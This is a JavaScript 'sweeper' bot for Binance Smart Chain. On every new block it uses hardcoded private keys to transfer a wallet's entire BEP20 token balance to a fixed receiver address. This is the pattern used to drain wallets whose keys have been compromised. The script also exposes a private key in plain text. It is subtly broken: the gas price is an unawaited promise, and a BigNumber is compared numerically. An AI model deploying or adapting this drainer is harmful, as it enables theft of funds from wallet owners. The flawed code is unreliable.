const { EtherscanProvider } = require('@ethersproject/providers')
const { sign } = require('crypto')
const { ethers, Wallet, Signer } = require('ethers')
const { TransactionDescription, TransactionTypes } = require('ethers/lib/utils')

const provider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/")

const addressReceiver = '0xbEF25E0b188F0090C7ac88488D97b2AAc77B4d4D'

const privateKeys = ["b89f5a6c3c85b74edb4308c4750c87bf65f1715c9a6b396c250a03069a798a4c"] 

process.on('uncaughtException', function(err) {
    console.log('Caught exception: ' + err);
  });

const contractAddress = "0x477bc8d23c634c154061869478bce96be6045d12" 

const BEP20ABI = [
    "function transfer(address to, uint amount)"
];

const balABI = [{
    "constant": true,
    "inputs": [{
        "internalType": "address",
        "name": "account",
        "type": "address"
    }],
    "name": "balanceOf",
    "outputs": [{
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
    }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}]

const bot = async =>{
    provider.on('block', async () => {
        console.log('Scanning new block.. ;)');
        for (let i = 0; i < privateKeys.length; i++){
            const _target = new ethers.Wallet(privateKeys[i]);
            const target = _target.connect(provider);
            const balance = await provider.getBalance(target.address);
            const nonce = await provider.getTransactionCount(target.address)

            // Balance
            const signer = new ethers.Wallet(privateKeys[i], provider);
            const _contract = new ethers.Contract(contractAddress, balABI, provider);
            const contract = _contract.connect(signer);
            const tokenBal = await contract.balanceOf(target.address);

            // Data
            let iface = new ethers.utils.Interface(BEP20ABI);
            let data = iface.encodeFunctionData("transfer", [addressReceiver, tokenBal])

             // Custom Gas Price       
            const gasPrice = provider.getGasPrice()
            
            if (tokenBal > 10){ 


                try {
                    await target.sendTransaction({
                        from: target.address,
                        to: contractAddress,
                        gasLimit: 120000,
                        gasPrice: gasPrice,
                        nonce: nonce,
                        data: data,
                    });
                    console.log(`Transfer broadcasted without errors..`);
                } catch(e){
                    console.log(`error: ${e}`);
                }
            }
        }
    })
}
bot();